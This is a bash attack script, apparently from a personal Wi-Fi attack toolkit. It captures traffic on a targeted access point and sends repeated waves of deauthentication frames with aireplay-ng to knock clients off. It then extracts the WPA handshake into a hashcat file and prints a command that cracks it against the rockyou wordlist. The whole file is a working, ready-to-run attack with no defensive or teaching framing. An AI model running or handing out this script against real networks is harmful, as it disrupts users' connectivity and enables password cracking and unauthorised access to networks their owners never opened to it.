#!/bin/bash
# Extended Capture - Multiple deauth waves with early exit on success
# Usage: ./attack_extended_capture.sh <BSSID> <CHANNEL> <SSID>

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: ./attack_extended_capture.sh <BSSID> <CHANNEL> <SSID>"
    exit 1
fi

BSSID=$1
CHANNEL=$2
SSID=$3
CAPTURE_DIR="/home/ov3rr1d3/wifi_arsenal/captures"
SCRIPT_DIR="/home/ov3rr1d3/wifi_arsenal/scripts"

# Sanitize SSID for filename
if [ -z "$SSID" ] || [ "$SSID" = "<hidden>" ]; then
    SSID="hidden"
fi
SAFE_SSID=$(echo "$SSID" | tr ' /:*?"<>|' '_')

# Generate timestamp
TIME_PART=$(date +%I-%M%p | tr 'A-Z' 'a-z')
DATE_PART=$(date +%m-%d-%Y)
TIMESTAMP="${TIME_PART}_${DATE_PART}"

OUTPUT_PREFIX="$CAPTURE_DIR/AP=${SAFE_SSID}_$TIMESTAMP"
CAPTURE_FILE="${OUTPUT_PREFIX}-01.pcapng"

echo "[*] METHOD 5: EXTENDED CAPTURE WITH EARLY EXIT"
echo "[*] Targeting: $BSSID on channel $CHANNEL"
echo "[*] Strategy: Deauth waves with check after each - exits on success"
echo ""

# Ensure alfa0 is in monitor mode
echo "[*] Setting alfa0 to monitor mode on channel $CHANNEL..."
$SCRIPT_DIR/mode_manager.sh ensure alfa0 monitor

if [ $? -ne 0 ]; then
    echo "[-] Failed to set monitor mode"
    exit 1
fi

# Set channel
sudo iw dev alfa0 set channel $CHANNEL

# Start capture in background (long timeout, we'll kill it when done)
echo "[*] Starting packet capture..."
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w "$OUTPUT_PREFIX" --output-format pcapng alfa0 >/dev/null 2>&1 &
AIRODUMP_PID=$!

# Wait for airodump to initialize
sleep 3

# Function to check for handshake and exit if found
check_and_exit() {
    local wave_num=$1
    
    # Check both possible capture file extensions
    local cap_file=""
    if [ -f "${OUTPUT_PREFIX}-01.pcapng" ]; then
        cap_file="${OUTPUT_PREFIX}-01.pcapng"
    elif [ -f "${OUTPUT_PREFIX}-01.cap" ]; then
        cap_file="${OUTPUT_PREFIX}-01.cap"
    fi
    
    if [ -n "$cap_file" ]; then
        # Use helper to check for valid handshake
        if $SCRIPT_DIR/check_handshake.sh "$cap_file" "${OUTPUT_PREFIX}.hc22000"; then
            echo ""
            echo "[+] ✓ HANDSHAKE CAPTURED after wave $wave_num!"
            echo "[+] SUCCESS: Hash file ready: ${OUTPUT_PREFIX}.hc22000"
            
            # Kill capture
            kill $AIRODUMP_PID 2>/dev/null
            wait $AIRODUMP_PID 2>/dev/null
            
            # Cleanup extra files
            rm -f "${OUTPUT_PREFIX}-01.csv" "${OUTPUT_PREFIX}-01.kismet.csv" "${OUTPUT_PREFIX}-01.kismet.netxml" "${OUTPUT_PREFIX}-01.log.csv" 2>/dev/null
            
            echo ""
            echo "[*] To crack:"
            echo "    hashcat -m 22000 ${OUTPUT_PREFIX}.hc22000 /usr/share/wordlists/rockyou.txt"
            exit 0
        fi
    fi
}

# Send 5 deauth waves, check after each
TOTAL_WAVES=5
for WAVE in $(seq 1 $TOTAL_WAVES); do
    echo "[*] Deauth wave $WAVE/$TOTAL_WAVES..."
    sudo aireplay-ng -0 10 -a "$BSSID" alfa0 >/dev/null 2>&1
    
    echo "[*] Waiting 30 seconds for reconnection..."
    sleep 30
    
    echo "[*] Checking for handshake..."
    check_and_exit $WAVE
    echo "[*] No handshake yet, continuing..."
    echo ""
done

# Final wait and check
echo "[*] All waves complete. Final 30 second wait..."
sleep 30
check_and_exit "final"

# Kill capture
kill $AIRODUMP_PID 2>/dev/null
wait $AIRODUMP_PID 2>/dev/null

# Final conversion attempt
echo "[-] FAILED: No valid handshake captured after all waves"

# Cleanup
rm -f "${OUTPUT_PREFIX}-01.csv" "${OUTPUT_PREFIX}-01.kismet.csv" "${OUTPUT_PREFIX}-01.kismet.netxml" "${OUTPUT_PREFIX}-01.log.csv" 2>/dev/null

exit 1
